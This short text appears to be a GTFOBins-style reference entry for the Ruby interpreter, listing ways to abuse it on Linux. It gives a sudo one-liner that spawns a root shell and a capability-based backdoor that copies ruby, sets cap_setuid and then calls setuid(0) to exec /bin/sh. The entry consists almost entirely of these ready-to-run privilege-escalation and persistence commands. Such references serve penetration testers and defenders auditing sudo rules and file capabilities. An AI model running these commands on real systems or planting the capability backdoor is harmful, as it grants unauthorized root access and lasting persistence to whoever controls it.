***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * sudo ruby -e 'exec "/bin/sh"'
***** Capabilities *****
It can manipulate its process UID and can be used on Linux as a backdoor to
maintain elevated privileges with the CAP_SETUID capability set. This also
works when executed by another binary with the capability set.
    * cp $(which ruby) .
      sudo setcap cap_setuid+ep ruby

      ./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
